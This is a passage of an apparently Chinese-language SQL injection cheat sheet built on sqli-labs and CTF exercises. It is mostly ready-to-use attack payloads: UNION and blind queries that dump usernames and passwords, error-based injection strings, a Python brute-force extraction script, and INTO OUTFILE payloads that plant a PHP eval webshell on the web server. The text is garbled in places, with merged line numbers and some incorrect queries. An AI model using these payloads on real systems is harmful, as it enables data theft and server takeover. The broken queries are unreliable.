弱类型比较 ==。 对于布尔盲注 ?id=1&#39; and &#39;1 ?id=1&#39; and &#39;a 这里没有使用注释符号进行后面的单引号闭合，使用的是手工单引号闭合 或者， ?id=1&#39; and 1=1# ?id=1&#39; and 1=2# 两者的页面截然不同，一个正常回显，一个没有回显的话，就可判断是布尔盲注。 对于 时间盲注 ?id=1&#39; and sleep(3)# ，类似的有以下几种 在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。 因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。 MySQL benchmark(100000000,md(5)) sleep(3) PostgreSQL PG_sleep(5) Generate_series(1,1000000) SQLServer waitfor delay ‘0:0:5’在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。 在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。 常见 SQL 注入功能点 只要是存在数据库交互的地方都有可能出现 SQL 注入。 常出现在 登录页面、订单页面、文章或新闻展示页面、修改密码页面（二次注入）、涉及获取 HTTP 头（XFF等）的功能点等。 注释：–+ # 闭合方法：注释闭合、手动闭合 and ‘1 三、Mysql 注入3.1 必备12345注释：# --/*......*//*!......*/ 元数据库 information_schema 12345678910111213141516元数据库 information_schema 中：存放数据库信息的表：schemataschemata 表中字段 schema_name 存放所有数据库名；存放表信息的表：tablestables 表中字段 table_name 存放所有表名字段 table_schema 存放所有表所在的数据库名；存放所有字段信息的表：columnscolumns 表中字段 column_name 存放所有字段名，字段 table_name 存放所有字段所在的表名，字段 table_schema 存放所有字段所在的数据库名； 语句分类： 123451.DQL(数据查询语言)：查询语句，所有的 select 语句2.DML(数据操作语言)：insert , delete , update , 对表中的 数据 进行 增删改3.DDL(数据定义语言)：create , drop , alter 对表 结构 的 增删改4.TCL(事务控制语言)：commit 提交数据，rollback 回滚数据 Transaction5.DCL(数据控制语言)：grant 授权，revoke 撤销权限等 基本语句： 123456789101112131415161718# 查库：show databases；select schema_name from information_schema.schemata；# 建库：create database + 库名;# 删库：drop database + 库名;# 进入数据库：use + 库名；# 查表：show tables；select table_name from information_schema.tables where table_schema=&#x27;security&#x27;；# 查列：select * from users；select column_name from information_schema.columns where table_name=&#x27;users&#x27;；# 查字段：select username,password from security.users； 基本函数 123456789101112131415161718192021222324252627282930313233343536373839#数据库安装、路径，用户 信息version(); Mysql 数据库版本database(); 当前 数据库名user(); 数据库的用户名current_user(); 当前用户名session_user(); 连接到数据库的用户名system_user(); 系统用户名@@datadir(); 数据库文件的存放路径@@version_compile_os; 操作系统版本@@basedir; 数据库的安装目录#字符串长度、截取length(); 返回字符串的长度substring(a,b,c); 截取字符串substr(a,b,c); mid(a,b,c); 三个参数：a.截取的字符串 b.截取的起始位置 c.长度left(a,b); 从左侧截取a的前b位，正确返回1，错误返回0#字符串配对连接concat(a,0x5e,b); 字符串配对连接concat_ws(&#x27;~&#x27;,A,B); 含有分隔符的连接字符串group_concat(); 将字符串连接为一个组，可将不同列分到同一行中#字符串特殊处理ord(); 返回ASCII码ascii(&#x27;a&#x27;); 将字母 a 转换为ascii值rand(); 返回0~1之间的随机浮点数round(); 返回最近的整数值md5(); 返回MD5值hex(); 将字符串转换为十六进制unhex(); hex()的反向操作floor(x); 返回不大于x的最大整数load_file(); 读取文件，返回文件内容作为一个字符串sleep(a); 沉睡a秒if(true,t,f); 判断语句为true ,执行第一个，否则第二个find_in_set(); 返回字符串在字符串列表中的位置benchmark(); 指定语句执行的次数name_const(); 返回表作为结果 导入数据： 12当希望导入一个 较大 的文件或者是想要批量的执行sql语句时，可以使用 mysql 中的 source 命令使用方法：source + 文件路径(直接拖拽) 3.2 语句mysql 对 表的结构的更改语句 12345678910111213141516171819# createcreate table 表名( 字段名1，数据类型， 字段名2，数据类型， 字段名3，数据类型， ......);# insertinsert into 表名(字段名1，字段名2，字段名3......) values(值1，值2，值3......)；# deletedelete from 表名 where 条件;//可回滚对于大表：truncate table 表名;//不可回滚，将会永久丢失# updateupdate 表名 set 字段名1=值1,字段名2=值2,......where 条件； 12345678910111213141516# 修改表名称：语法一： alter table tbl_name rename[to|as] new_tbl_name --可以更改一张数据表名称语法二：rename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namew…… --可以多表更改名称#添加表列alter table test add column name varchar(10); #删除表列alter table test drop column name; #修改表列类型alter table test modify address char(10) ||alter table test change address address char(40)#修改表列名alter table test change column address address1 varchar(30) 常用字段 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# select select 字段1，字段2，...... from + 表名 where + 条件;# between and select * from users where id between 2 and 8;select * from users where id &gt;=2 and id &lt;=8;# in not inselect password from users where id not in(5,8);指查找出 id不等于5 和 id不等于8 的用户的密码注：不是 5~8，in之后不是一个区间 # like1.% 代表任意多个字符2._ 代表任意一个字符select username from users where username like &#x27;%b%&#x27;;指查找出用户名中带有字母b的用户名select username from users where username like &#x27;_a%&#x27;;指查找出用户名中带第二个字母为a的用户名select username from users where username like &#x27;%b&#x27;;指查找出用户名中带最后一个字母为b的用户名select username from users where username like &#x27;%\\_%&#x27;;指查找出用户名中带有下划线_的用户名注：特殊字符需要转义# order byselect username from users order by 字段名；注：默认为升序排列指定升序：ascselect username from users order by 字段名 asc；指定降序：descselect username from users order by 字段名 desc；双重需求：select username from users order by 字段名1 desc,字段名2 asc；# 分组函数select sum(grade) from users;select avg(grade) from users;select max(grade) from users;select min(grade) from users;# 空处理函数select sum(ifnull(salary,0)*12), from crew;求一年的薪水之和，当薪水为NULL时，被当作0来处理# count(*) 与 countcount(*) :统计总记录条数，而不是统计某个字段中的数据，与字段无关count(具体的某个字段)：统计具体字段中不为NULL的总数1.字符串数据 sum,avg 为 0，max,min 按字母大小取2.分组函数会自动忽略 NULL3.数学运算 中如果有NULL参与，结果为定为NULL4.分组函数不能直接出现在 where 后面，原因是 group by 是在where语句执行结束之后执行的5.分组函数可组合使用# group by 与 havinggroup by：按照某个字段或某些字段进行分组having：对分组之后的数据进行再次过滤，即having 必须跟在 group by 后面使用select max(grade) from students group by classes;先根据班级分组，再查出各个班级的成绩最高学生的成绩1.分组函数一般与 group by 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 group by 语句执行结束后才会执行2.当一条sql语句没有 group by 时，整张表会自成一组3.当sql语句中使用group by时，select之后只能跟参与分组的字段或者分组函数注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。# distinct 去重distinct 关键字 去除重复记录select distinct job from company;查询该公司中的工作岗位# 语句执行顺序select 5号：挑选出满足条件的数据from 1号：定表where 2号：过滤原始数据group by 3号：进行分组 having 4号：对数据进行再次过滤order by 6号：进行排序 12345# inner joinselect a.ename,b.dname from emp a join dept b on a.deptno=b.deptno;# left/right joinselect dname,ename from dept a left join emp b on a.deptno=b.deptno; 四、union 联合注入(单引号闭合字符型为例)注入判断 12?id=1&#x27;?id=1&#x27;# order by 查列 123?id=1&#x27; order by x--+?id=1&#x27; order by x## 其中x输入数字代表哪一列，使用二分法缩小范围,x之后是两个减号与加号，代表注释 判断回显位置，三列为例 12345?id=-1&#x27; union select 1,2,3--+?id=0&#x27; union select 1,2,3--+?id=1&#x27; and 1=2 union select 1,2,3--+# 前面是为了否定 id=1 时的回显，防止人家的 sql 语句只 limit 0,1 # 这样就无法查看到我们想要的信息了 回显位置注入 sql 语句 1?id=-1&#x27; union select 1,(select database()),3--+ 查库 1?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+ 查某一个库中的表 注意：仅仅是查当前数据库 database() 的表，由于处于当前数据库下，是不能查看其它数据库中数据的 1?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3--+ 查列 1?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.collumns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),3--+ 查内容，~ 连接 1234?id=-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;~&#x27;,username,password))from security.users),3--+# 同时查三列数据的话?id=-1&#x27; union select 1,group_concat(id,&#x27;--&#x27;,username,&#x27;--&#x27;,password),3 from users# 五、Boolean 盲注5.1 手动：结合 Burp 爆破进行查数据库长度 12?id=1&#x27; and length(database())=1--+# 爆破数字 1 判断库名组成 security 12345?id=1&#x27; and left(database(),1)=&#x27;a&#x27;--+# 爆破字母 a?id=1&#x27; and ascii(substr(database(),1,1))=&#x27;b&#x27;--+# 爆破 ascii 值 b 查表 users 12?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit a,1),1,1)) =&#x27;b&#x27;--+# 同时爆破数字a,和 数字b，其中 b 是 ascii 值 查列 username password 12?id=1&#x27; and ascii(substr((select column_name from information_schema.tables where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit a,1),1,1)) = &#x27;b&#x27;--+# 同时爆破数字a,和 数字b，其中 b 是 ascii 值 查内容 12345?id=1&#x27; and ascii(substr((select username from security.users limit a,1),1,1))=&#x27;b&#x27;--+# 爆破 ascii 值 b?id=1&#x27; and ascii(substr((select password from security.users limit 0,1),1,1))=&#x27;b&#x27;--+# 爆破 ascii 值 b 5.2 脚本1 六、五大报错注入利用条件：页面回显 SQL语句执行的错误信息，例如 mysql_error() 12# floor()id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) 12# extractvalue()id = 1 and (extractvalue(1, concat(0x5c,(select user())))) updatexml() 函数： 这个函数的第二个参数本应该是合法的 XPATH 路径，否则就会在引发报错的同时将传入的参数进行输出。我们利用这个特征，当题目存在回显时，将我们想的到的信息传入这个函数的第二个参数即可查询。 12# updatexml()id = 1 and (updatexml(0x3a,concat(1,(select user()),1))) 12# exp()id =1 and EXP(~(SELECT * from(select user())a)) 12345678910111213141516171819# 六种函数 (使用方法相同)GeometryCollection()id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))polygon()id =1 AND polygon((select * from(select * from(select user())a)b))multipoint()id = 1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()id = 1 AND multilinestring((select * from(select * from(select user())a)b))linestring()id = 1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon()id =1 AND multipolygon((select * from(select * from(select user())a)b)) 七、文件读写7.1 手动写文件 123?id=-1&#x27; union select 1,&quot;&lt;?php @eval(\\$_POST[1]); ?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;--+# 可将文件内容转换成十六进制?id=-1&#x27; union select 1,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e,3 into outfile &quot;/var/www/html/1.php&quot;--+ 有回显时 读取文件 123?id=-1&#x27; union select 1,2,load_file(&#x27;/var/www/html/1.php&#x27;)--+# 文件路径 可使用 十六进制?id=-1&#x27; union select 1,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870)--+ 无回显 盲注读取文件 12?id=-1&#x27; and ascii(mid((select hex(load_file(&#x27;/var/www/html/1.php&#x27;))),a,1))&gt;b--+# 同时爆破 数字 a 和 ascii 值 b 7.2 脚本123456789101112```## 八、延时注入### 8.1 手动：结合 Burp Respond当页面上无回显，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，可考虑延时注入。```bash?id=1&#x27; and sleep(3)--+ 查库 1234?id=1&#x27; and if(length(database())=a,sleep(3),1)--+# 爆破数字 a?id=1&#x27; and if(ascii(substr(database(),a,1))=b,sleep(3),1)--+# 同时爆破 数字 a 和 ascii 值 b 查表 12?id=1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),a,1))=b,sleep(3),1)--+# 同时爆破 数字 a 和 ascii 值 b 查列 12?id=1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),a,1))=b,sleep(3),1)--+# 同时爆破 数字 a 和 ascii 值 b 查字段 123?id=1&#x27; and if(ascii(substr((select group_concat(username) from security.users),a,1))=b,sleep(3),1)--+?id=1&#x27; and if(ascii(substr((select group_concat(password) from security.users),a,1))=b,sleep(3),1)--+# 同时爆破 数字 a 和 ascii 值 b 8.2 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889```## 九、regexp 正则匹配测试```bashmysql&gt; select * from users where username regexp &#x27;b$&#x27;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.03 sec)mysql&gt; select * from users where username regexp &#x27;d&#x27;;+----+----------+-----------+| id | username | password |+----+----------+-----------+| 1 | Dumb | Dumb || 3 | Dummy | p@ssword || 5 | stupid | stupidity || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+-----------+9 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;^a&#x27;;+----+----------+------------+| id | username | password |+----+----------+------------+| 2 | Angelina | I-kill-you || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 |+----+----------+------------+6 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;admin[0-9]&#x27;;+----+----------+----------+| id | username | password |+----+----------+----------+| 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 |+----+----------+----------+4 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;.n&#x27;; #.匹配任意字符+----+----------+------------+| id | username | password |+----+----------+------------+| 2 | Angelina | I-kill-you || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+9 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;a|b&#x27;; #含有 a 或 b 的+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+10 rows in set (0.00 sec) 9.1 手动12?id=1&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),a,1)regexp(&#x27;b&#x27;),1,2)=&#x27;1# 同时爆破 数字 a 和 字母 b 9.2 脚本123456789101112131415161718192021222324import requestsimport stringurl = &quot;http://xxxxx&quot;flagstr=&quot; _&#123;&#125;-&quot; + string.ascii_lowercase + string.digitsflag = &#x27;&#x27;for i in range(1,45): for j in flagstr: #payload = f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot; #payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot; payload = f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot; data = &#123; &#x27;username&#x27;: payload, &#x27;password&#x27;: &#x27;1&#x27; &#125; r = requests.post(url, data=data) if &quot;密码错误&quot; == r.json()[&#x27;msg&#x27;]: flag += j print(flag) if &quot;&#125;&quot; == j: exit(0) break 十、异或注入异或：一种逻辑运算，简言之，相同为假，不同为真，NULL 与任何条件欲火结果都为 NULL，mysql 中的符号是 ^ 和 xor。 测试： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select 1=1 ^ 1=1 as res;+-----+| res |+-----+| 0 |+-----+1 row in set (0.00 sec)mysql&gt; select 1=1 xor 1=2 as res;+-----+| res |+-----+| 1 |+-----+1 row in set (0.00 sec)mysql&gt; select 1=2 xor 1=2 as res;+-----+| res |+-----+| 0 |+-----+1 row in set (0.00 sec)mysql&gt; select null xor 1=2 as res;+------+| res |+------+| NULL |+------+1 row in set (0.00 sec)mysql&gt; select null xor 1=1 as res;+------+| res |+------+| NULL |+------+1 row in set (0.00 sec)mysql&gt; select null xor null as res;+------+| res |+------+| NULL |+------+1 row in set (0.00 sec) 常用手段：用于判断 所过滤的字符串 1234?id=1&#x27;^(0)## 得到正常的回显页面，由于异或之后得到 真?id=1&#x27;^(1)## 得到错误的回显页面，由于异或之后得到 假 常常用于判断我们所注入的某些字段是否被过滤 1?id=1&#x27;^(length(&#x27;union&#x27;)&gt;0)# 如果 union 已被过滤，那么得到的将会是 length(0&gt;0) ，显然是不成立的，那就将会是 1&#39;^0 ，得到的为 真，所以将会返回 正常 的页面； 如果 union 没有被过滤，相反的，将会得到为假的异或，返回的将会是 错误 的页面。 由此可以判断某些字符的过滤情况。 常常使用： 123?id=1&#x27;^(length(&#x27;select&#x27;)&gt;0)#?id=1&#x27;^(length(&#x27;and&#x27;)&gt;0)#?id=1&#x27;^(length(&#x27;or&#x27;)&gt;0)# 符号特点： ^ 运算符会做位异或运算 xor 做逻辑运算 1 xor 0 会输出 1 ，其它情况输出其余所有数据 十一、宽字节注入防御原理为了防止 SQL注入漏洞，通常在源代码当中会对我们所输入的 SQL查询语句进行一个 转义 ，一般是对 单引号，双引号 进行一个转义变成 &#39; 或者是&quot;，这样Mysql在 执行 SQL语句时，不会影响到查询，即不会出现报错，数据存储在数据库当中时不会含有 \\ ，也就是说，它仅仅是在执行 SQL语句时进行了转义，当我们从数据库中向外调出数据时并不会含有 \\ ，也就预防了 SQL注入。 如果我们不进行转义，按照一般 攻击者的思路进行 SQL注入，都是通过 ?id=1’ 进行验证，如下图，如果没有进行任何防御，即没有进行转义操作，就会出现报错，也就很容易的验证出来了 的确存在 SQL注入，并且容易看到注入方式。 常使用的 转义函数： 1234567891011121314151617addslashes() 函数返回在预定义字符之前添加反斜杠的字符串 单引号（&#x27;） 双引号（&quot;） 反斜杠（\\） NULL mysql_real_escape_string() 函数: 转义 SQL 语句中使用的字符串中的特殊字符下列字符受影响： \\x00 \\n \\r \\ &#x27; &quot; \\x1a addslashes() 解决： 网页连接数据库时，将字符编码设置为 GBK 编码集合，然后进行 SQL语句的拼接，进行数据库的查询。 GBK编码采用 双字节编码，编码范围为 8140~FEFE 转义字符 \\ 的编码是 5c ，其在 GBK的编码范围之内，如果我们在转义字符之前 提交一个同样在编码范围之内的字符，网页在解析时，就会将其与 后面的转义字符进行一个匹配，组成一个 双字节的 GBK编码的汉字，从而失去了转义的作用。 常用方法：在使用单引号 或者 双引号之前添加 %df 字符 方法二：在使用单引号 或者 双引号之前添加 %aa%5c 字符 解释： 123456例如: ?id=1%aa%5c&#x27; 其实是： ?id=1%aa\\&#x27; 即： ?id=1%aa%\\\\\\&#x27;其中 \\ 是 %5c; &#x27; 是 %27数据库中做了转义处理之后变成：%aa%5c%5c%5c%27这样，%aa和%5c进行组合称为了一个汉字，%5c与%5c仍旧是 \\\\ ，而 %27(单引号) 就分离出来了 GBK编码范围 十二、二次注入根源在于：来发这信任从数据库中取出的数据都是无害的。 原理：攻击者构造的恶意数据 存储在 数据库 后，恶意数据 被读取 并进入到 SQL查询语句 所导致的注入。防御者可能在用户 输入 恶意数据时对其中的特殊字符进行了 转义处理 ，但在恶意数据插入到数据库时被处理的数据又 被还原 并存储在数据库中，当Web程序 调用 存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。也就是说在应用程序中输入恶意造的数据库查询语句时会被转义，但是在数据库内部调用读取语句的时候又被还原。 二次注入步骤:第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了 转义处理，在写入数据库的时候又保留了原来的数据。第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询即调用已存储在数据库中的数据时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 一般结合 修改密码 功能点 进行利用 举例： 已知用户登陆时的查询 login.php 1234查询防御：login.php$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;; 我们使用下面 用户登录 12Dumb&#x27;Dumb 则实际进行操作的语句成为 1SELECT * FROM users WHERE username=&#x27;Dumb\\&#x27;&#x27; and password=&#x27;Dumb&#x27; 由于进行了 mysql_real_escape_string 转义，则不会引发 sql 注入，从而成功进行了防御 已知注册用户时的插入 login_create.php 12345插入防御：login_create.php$username= mysql_escape_string($_POST[&#x27;username&#x27;]) ;$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);$sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;; 我们 注册新的用户 123Dumb&#x27;#123456123456 同样对我们输入的数据进行了转义处理，则实际操作语句是 12username 进行转义处理之后得到 Dumb\\&#x27;#，代入，即insert into users ( username, password) values(\\&quot;Dumb\\&#x27;#\\&quot;, \\&quot;123456\\&quot;) 这样我们成功注册了一个新的用户 12Dumb&#x27;#123456 已知用户修改密码 pass_change.php 12345$username= $_SESSION[&quot;username&quot;];$curr_pass= mysql_real_escape_string($_POST[&#x27;current_password&#x27;]);$pass= mysql_real_escape_string($_POST[&#x27;password&#x27;]);$re_pass= mysql_real_escape_string($_POST[&#x27;re_password&#x27;]);$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 可以看到，此时的用户名没有进行转义防御就出现在了sql语句当中 我们以新注册的 Dumb&#39;# 用户登录进去，利用修改密码的功能 123Dumb&#x27;#654321654321 代入 sql 语句中得到 1UPDATE users SET PASSWORD=&#x27;654321&#x27; where username=&#x27;Dumb&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; 这样看来，我们实际上修改的是 用户名为 Dumb 的密码 这样我们就在只以知某一用户名，不知其密码的情况下，通过 二次注入 ，成功的可以登录其它用户的账号了 十三、堆叠注入SQL语句书写时，以 分号 ; 表示一条SQL语句结束，通过使用分号同时执行多条 SQL语句 即为 堆叠注入 。该注入可修改数据库的任意结构和数据。 测试： 123456789101112131415161718192021222324252627282930313233343536373839404142mysql&gt; select * from users where id= 1;create table qwe like users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)Query OK, 0 rows affected (0.04 sec)mysql&gt; show tables;+--------------------+| Tables_in_security |+--------------------+| emails || qwe || referers || uagents || users |+--------------------+5 rows in set (0.00 sec)mysql&gt; select * from users where id= 1;drop table qwe;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)Query OK, 0 rows affected (0.01 sec)mysql&gt; show tables;+--------------------+| Tables_in_security |+--------------------+| emails || referers || uagents || users |+--------------------+4 rows in set (0.00 sec) 堆叠注入写一句话木马文件 1a&#x27;;select &#x27;&lt;?php @eval($_POST[111]); ?&gt;&#x27; into outfile &#x27;/var/www/html/hacker.php&#x27;;--+ 题例：[GYCTF2020]Blacklist1 123456781&#x27; order by 2#1&#x27;;show databases;#1&#x27;;select database();#1&#x27;;show tables;1&#x27;;show columns from 表名;#1&#x27;create table 新表名 like 已知表名;#1&#x27;;drop table 新表名;#1&#x27;;handler 表名 open;handler 表名 read first;# 十四、HTTP 头部注入14.1 User-Agent 注入源码： 123$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; 当将 客户端可控的 $uagent 带入代入 $insert sql 语句时，必须将紧随其后的 单引号先闭合 抓包，修改 User-Agent 值 1234User-Agent:a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1# 这样代进去即为$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;$IP&#x27;, $uname)&quot;; 14.2 Referer 注入源码： 123$uagent = $_SERVER[&#x27;HTTP_REFERER&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; 同样的道理：当将 客户端可控的 $uagent 带入代入 $insert sql 语句时，必须将紧随其后的 单引号先闭合 抓包，修改 Referer 值 1234Referer:a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1# 这样代进去即为$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;$IP&#x27;)&quot;; 14.3 Cookie 注入如今绝大部门开发人员在开发过程中会对用户传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get，post这种方式提交的数据进行参数过滤。 但我们知道，很多时候，提交数据并非仅仅只有get / post这两种方式，还有一种经常被用到的方式：request(“xxx”),即request方法。通过这种方法一样可以从用户提交的参数中获取参数值。 这就造成了cookie注入的最基本条件：使用了request方法，但是只对用户get / post提交的数据进行过滤。 例如：www.xx.com/search.asp?id=1 访问：www.xx.com/srarch.asp 发现不能访问，说缺少id参数。 我们试着将id=1放在cookie中再次访问，查看能否访问，如果能访问，则说明id参数可以通过cookie提交。 那么，如果后端没有对cookie中传入的数据进行过滤，那么，这个网站就有可能存在cookie注入了！ 123$cookee = $username;$cookee = $_COOKIE[&#x27;uname&#x27;];$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; 十五、无列名注入 Mysql 版本 &gt; 5 时，都会存在一个元数据库 information_schema ，其中记录着 mysql 所有库、以及表的结构，我们通常的 sql 注入手段即是通过该元数据库来获取到其它库以及表的信息。那如果这个 information_schema 被过滤掉了该怎么办？ 15.1 使用别的具有类似功能的库除了 information_schema 中存在 tables schemata columns 等表的信息外，在高版本当中还存在 INNODB_TABLES INNODS_COLUMNS 中也记录着表的结构。 15.1.1 sys 数据库 利用mysql5.7新增的 sys.schema_auto_increment_columns 基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名 关于该表的视图 https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html sys.schema_table_statistics_with_buffer 12345678# 利用语句#查数据库select table_schema from sys.schema_auto_increment_columns; #查表select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema = database(); select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database(); 类似的 123456789与它表结构相似的视图还有 sys.x$schema_table_statistics_with_buffer sys.x$schema_table_statistics sys.x$ps_schema_table_statistics_io 参考：https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-redundant-indexes.html 15.1.2 mysql 默认存储引擎 INNODB 所携带的表 mysql.innodb_table_stats mysql.innodb_index_stats 15.2 union select 构造虚表实验： 12select * from `users`;select 1,2,3 union select * from users; 123456789101112131415161718192021222324mysql&gt; select 1,2,3 union select * from users;+----+----------+------------+| 1 | 2 | 3 |+----+----------+------------+| 1 | 2 | 3 || 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | 321 || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 15 | Dummy&#x27;# | 123 |+----+----------+------------+15 rows in set (0.00 sec)# 我们将列名替换成为了 数字 1,2,3# 那么我们就可以使用数字来对应其中的列名 1234567891011121314151617181920212223mysql&gt; select `2` from (select 1,2,3 union select * from users)a;+----------+| 2 |+----------+| 2 || Dumb || Angelina || Dummy || secure || stupid || superman || batman || admin || admin1 || admin2 || admin3 || dhakkan || admin4 || Dummy&#x27;# |+----------+15 rows in set (0.00 sec)# 这时我们已经取到了第二列的内容 1234567891011121314151617181920212223# 当 `` 被过滤时，使用别名代替mysql&gt; select b from (select 1,2 as b,3 union select * from users)a;+----------+| b |+----------+| 2 || Dumb || Angelina || Dummy || secure || stupid || superman || batman || admin || admin1 || admin2 || admin3 || dhakkan || admin4 || Dummy&#x27;# |+----------+15 rows in set (0.00 sec) 12345678910111213141516171819202122232425# 同时查询多列mysql&gt; select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a;+----------------------+| concat(`2`,0x5e,`3`) |+----------------------+| 2^3 || Dumb^Dumb || Angelina^I-kill-you || Dummy^321 || secure^crappy || stupid^stupidity || superman^genious || 